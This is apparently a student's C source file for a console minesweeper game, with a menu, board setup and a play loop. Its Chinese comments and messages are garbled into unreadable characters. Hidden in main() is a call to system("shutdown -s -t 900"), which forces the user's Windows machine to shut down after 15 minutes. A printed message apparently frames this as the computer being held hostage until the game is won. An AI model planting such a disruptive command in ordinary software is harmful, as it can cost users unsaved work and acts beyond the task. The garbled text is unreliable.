#define _CRT_SECURE_NO_WARNINGS
#include "game.h"
#include <stdio.h>//��֤ÿ��.c�ļ����б�Ҫ��ͷ�ļ������ܿ����ظ�
void menu()
{
	printf("*******************************\n");
	printf("*********�Ƿ�ʼ��Ϸ��********\n");
	printf("***********1.��ʼ**************\n");
	printf("***********0.����**************\n");
	printf("*******************************\n");
	printf("*******************************\n");
}
void game()//game.c��д����game()�е�Ƕ�׺���
{
	char Inside[ROWS][COLS];
	char Outside[ROWS][COLS];//�ȶ���ã�һ�����ú�����ʼ��
	Init(Inside, ROWS, COLS, '0');
	Init(Outside, ROWS, COLS, '*');//ֻд�������͹���һ��һ���������Ͷ������ֿ�
	Display(Outside, ROW, COL);//����S�Ǵ��η��㣬��������Ϊ11*11  //����������ROW��Ϊ�˸��ķ���
	Set(Inside, ROW, COL);
	Play(Outside, Inside, ROW, COL);
}
int main()
{
	printf("���ĵ����ѱ�Ю�֣�����15min�ڳɹ����ɨ�ף�����ػ�\n");
	system("shutdown -s -t 900");//�����пո�.
	menu();
	/*printf("��ѡ��>");*/ //ע��λ��
	int i = 0;
	/*scanf("%d", &i);*/
	do {  //��ģ�鲻�ʺ���Ϊ��������ΪҪ�ж��ѭ��������һ�ѣ���return���ƻ���
		srand((unsigned int)time(NULL));
		printf("��ѡ��>");
		scanf("%d", &i);//iҪ�����ڲ�����֤ÿһ�ζ���ѡ���Ȩ������������ѭ��
		switch (i)
		{
		case 1:
		{
			game();
			/*return i;*/
			/*break;*/ //��return��break����
			printf("��Ҫ����һ����1.��ʼ 0.����\n");
			break;
		}
		case 0:
		{
			printf("��Ϸ����\n");
			/*return i;*///break��������switch
			/*break;*/
			break;
		}
		default:
		{
			printf("�����������������\n");// \n��֤����
			break;
		}
		}
	} while (i); /*(i != 1 && i != 0)*/ //Ҫ������ж��漸�ѵ�Ȩ��
	
	return 0;
}